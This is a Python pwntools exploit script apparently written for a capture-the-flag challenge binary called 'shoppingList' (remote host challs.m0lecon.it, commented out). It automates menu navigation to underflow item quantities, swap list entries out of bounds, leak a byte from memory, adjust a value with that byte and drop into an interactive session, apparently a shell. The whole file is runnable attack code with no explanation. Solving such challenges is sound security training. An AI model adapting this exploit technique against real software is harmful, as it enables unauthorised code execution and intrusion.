#!/usr/bin/python3

from pwn import *
from time import sleep

r = process("./shoppingList", stdin=PIPE)

#r = remote("challs.m0lecon.it",8273)

def go_up():
    r.recv(4096)
    r.send("w")

def go_down():
    r.recv(4096)
    r.send("s")

def enter():
    r.recv(4096)
    r.send("\n\r")

def esc():
    r.recv(4096)
    r.send(p8(0x1b))

def view_list():
    enter()

def get_at_index(index, quantity):
    view_list()

    for i in range(index):
        go_down()
    enter()
    for i in range(quantity):
        go_down()
    enter()
    esc()


def swap(a, b):
    go_down()
    enter()

    for i in range(a):
        go_down()
    r.send("m")
    
    for i in range(a):
        go_up()

    
    for i in range(b):
        go_down()
    enter()
    esc()

def reduce(index, quantity):
    go_down()
    enter()

    for i in range(index):
        go_down()
        sleep(0.1)
    
    r.send("d")
    
    
    for i in range(quantity + 1):
        go_down()

    enter()
    esc()
    return

def gift(index):
    go_down()
    go_down()
    enter()
    for i in range(index):
        go_down()
    enter()


def show_my_list():
    go_down()
    enter()



get_at_index(0xe7, 1)

for i in range(2):
    get_at_index(0, 1)

gift(0)

reduce(0, 0xff)
reduce(0, 0xff)
reduce(0, 0xff)

swap(1, 2)

swap(1, 60)

show_my_list()

r.recvuntil(b"buckle")
r.recvuntil(b"Quantity: ")
byte = int(r.recvuntil(" ").strip())
log.warn("The byte is @ 0x%x", byte)
esc()
reduce(0, 0xff - (byte - 0x4))

swap(0, 60)


go_down()
go_down()
go_down()

enter()
sleep(1)
r.interactive()
